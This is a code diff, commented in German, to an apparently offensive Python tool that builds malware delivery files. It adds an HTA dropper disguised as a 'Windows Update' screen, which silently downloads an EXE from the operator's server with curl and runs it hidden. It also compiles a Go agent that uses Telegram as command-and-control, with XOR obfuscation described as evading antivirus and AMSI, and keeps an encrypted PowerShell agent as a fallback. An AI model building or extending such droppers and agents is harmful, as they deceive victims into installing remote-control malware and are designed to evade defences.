@@ -34,6 +34,46 @@ HELP = ToolHelp(
 
 DANGER = DangerLevel.BLACK
 
+# ── EXE-HTA Template (für Go-Agent — kein PowerShell) ─────────────────────────
+
+_HTA_EXE_TEMPLATE = '''\
+<html>
+<head>
+<HTA:APPLICATION
+    APPLICATIONNAME="Windows Update Assistant"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
+/>
+<title>Windows Update</title>
+</head>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim sh, tmp, n
+    Set sh = CreateObject("WScript.Shell")
+    Randomize
+    n = CStr(Int(Rnd * 89999) + 10000)
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%") & "\\svc" & n & ".exe"
+    sh.Run "cmd /c curl.exe -s -o " & Chr(34) & tmp & Chr(34) & " {EXE_URL}", 0, True
+    sh.Run tmp, 0, False
+    Self.Close
+End Sub
+</script>
+<body style="background:#0078d4;color:#fff;font-family:'Segoe UI',sans-serif;margin:0;padding:40px;">
+<div style="max-width:500px;margin:80px auto;text-align:center;">
+<h2 style="font-weight:300;margin-bottom:8px;">Windows Update</h2>
+<p style="opacity:.75;font-size:13px;">Updates werden heruntergeladen. Bitte warten...</p>
+<div style="width:220px;height:3px;background:rgba(255,255,255,.25);margin:28px auto;border-radius:2px;overflow:hidden;">
+<div style="width:50%;height:100%;background:#fff;border-radius:2px;animation:slide 1.5s ease-in-out infinite;"></div></div>
+<p style="opacity:.5;font-size:11px;">Dieser Vorgang kann einige Minuten dauern.</p>
+</div>
+<style>@keyframes slide{0%{margin-left:-50%}100%{margin-left:110%}}</style>
+</body>
+</html>
+'''
 
 # ── AV-Evasion Helpers ─────────────────────────────────────────────────────────
 
@@ -172,7 +212,8 @@ class AutoDelivery:
         self.token     = telegram_token
         self.chat_id   = telegram_chat_id
         self.interval  = telegram_interval
-        self._xor_key  = random.randint(0x21, 0x7E)  # Zufälliger Key pro Build
+        self._xor_key  = random.randint(0x21, 0x7E)
+        self._use_exe  = False
         self._server: http.server.HTTPServer | None = None
         self._running  = True
         self._visits: list[str] = []
@@ -198,44 +239,58 @@ class AutoDelivery:
         except Exception:
             return None
 
+    def _build_go_agent(self) -> str | None:
+        """Kompiliert Go-Agent EXE. Returns path or None."""
+        if not self.token or not self.chat_id:
+            return None
+        try:
+            from tools.c2.go_agent_builder import build, is_go_available
+            if not is_go_available():
+                return None
+            exe, _ = build(self.token, self.chat_id, self.out, self.interval)
+            return exe
+        except Exception:
+            return None
+
     def _write_files(self) -> list[tuple[str, str]]:
         files = []
+        exe_url  = f"{self._base_url()}/agent.exe"
+        dat_url  = self._dat_url()
+        loader   = _build_loader(dat_url, self._xor_key)
 
-        agent_ps1 = self._gen_agent_ps1()
-        loader_cmd = _build_loader(self._dat_url(), self._xor_key)
+        # ── Primär: Go-Binary (beste AV-Evasion) ──────────────────────────────
+        exe_path = self._build_go_agent()
+        if exe_path:
+            size = os.path.getsize(exe_path)
+            files.append(("agent.exe", f"Go-Agent ({size:,} Bytes, XOR-obfuskiert)"))
+            hta = _HTA_EXE_TEMPLATE.replace("{EXE_URL}", exe_url)
+            self._use_exe = True
+        else:
+            # ── Fallback: verschlüsselte PS1-Delivery ─────────────────────────
+            agent_ps1 = self._gen_agent_ps1()
+            if agent_ps1:
+                dat = _xor_b64(agent_ps1.encode("utf-8"), self._xor_key)
+                with open(os.path.join(self.out, "a.dat"), "w") as f:
+                    f.write(dat)
+                files.append(("a.dat", f"XOR-verschl. PS1-Agent (Key=0x{self._xor_key:02X})"))
+                with open(os.path.join(self.out, "a.ps1"), "w") as f:
+                    f.write(agent_ps1)
+            hta = _HTA_TEMPLATE.replace("{PS_CMD}", loader)
+            self._use_exe = False
 
-        if agent_ps1:
-            # Verschlüsselter Blob — Defender sieht nur zufällige Bytes
-            dat = _xor_b64(agent_ps1.encode("utf-8"), self._xor_key)
-            with open(os.path.join(self.out, "a.dat"), "w") as f:
-                f.write(dat)
-            files.append(("a.dat", f"XOR-verschlüsselter Agent (Key=0x{self._xor_key:02X})"))
-
-            # Plain PS1 als Fallback (nicht von HTA genutzt)
-            with open(os.path.join(self.out, "a.ps1"), "w") as f:
-                f.write(agent_ps1)
-            files.append(("a.ps1", "Plain Agent (Fallback, nicht für Evasion)"))
-
-        # HTA mit eingebautem Loader
-        hta = _HTA_TEMPLATE.replace("{PS_CMD}", loader_cmd)
         with open(os.path.join(self.out, "update.hta"), "w") as f:
             f.write(hta)
-        files.append(("update.hta", "HTA Dropper — fileless, verschlüsselt"))
+        files.append(("update.hta", "HTA Dropper" + (" [Go-EXE]" if self._use_exe else " [PS1]")))
 
         bat = _BAT_TEMPLATE.replace("{AGENT_URL}", self._agent_url())
         with open(os.path.join(self.out, "update.bat"), "w") as f:
             f.write(bat)
         files.append(("update.bat", "BAT Launcher"))
 
-        lnk = _LNK_BUILDER_PS1.replace("{PS_CMD}", loader_cmd)
-        with open(os.path.join(self.out, "make_lnk.ps1"), "w") as f:
-            f.write(lnk)
-        files.append(("make_lnk.ps1", "LNK-Builder"))
-
         readme = _README_TEMPLATE.format(
             TS=datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
             LHOST=self.lhost, PORT=self.port, KEY=f"0x{self._xor_key:02X}",
-            BASE=self._base_url(), PS_CMD_SHORT=loader_cmd[:80],
+            BASE=self._base_url(), PS_CMD_SHORT=loader[:80],
         )
         with open(os.path.join(self.out, "DELIVERY_LINKS.txt"), "w") as f:
             f.write(readme)
@@ -265,10 +320,14 @@ class AutoDelivery:
     async def start(self) -> AsyncGenerator[str, None]:
         yield "[*] Auto-Delivery startet..."
         yield f"[*] LHOST: {self.lhost}:{self.port}  →  Output: {self.out}"
-        yield f"[*] XOR-Key: 0x{self._xor_key:02X}  (zufällig pro Build)"
         yield ""
+        yield "[*] Kompiliere Go-Agent... (dauert ~10s)"
 
         files = self._write_files()
+
+        mode = "Go-EXE (kein PS, kein AMSI)" if self._use_exe else "PS1 XOR-verschlüsselt (Fallback)"
+        yield f"[+] Modus: {mode}"
+        yield ""
         yield "[+] Delivery-Dateien generiert:"
         for name, desc in files:
             yield f"    {name:<26}  {desc}"
@@ -285,7 +344,10 @@ class AutoDelivery:
         yield f"{'─'*60}"
         yield f"  HTA (Doppelklick)  :  {base}/update.hta"
         yield f"  BAT-Datei          :  {base}/update.bat"
-        yield f"  Payload (encrypted):  {self._dat_url()}"
+        if self._use_exe:
+            yield f"  EXE direkt         :  {base}/agent.exe"
+        else:
+            yield f"  Payload            :  {self._dat_url()}"
         yield f"{'─'*60}"
         yield f"\n[*] Warte auf Verbindungen... Ctrl+C zum Stoppen\n"
 
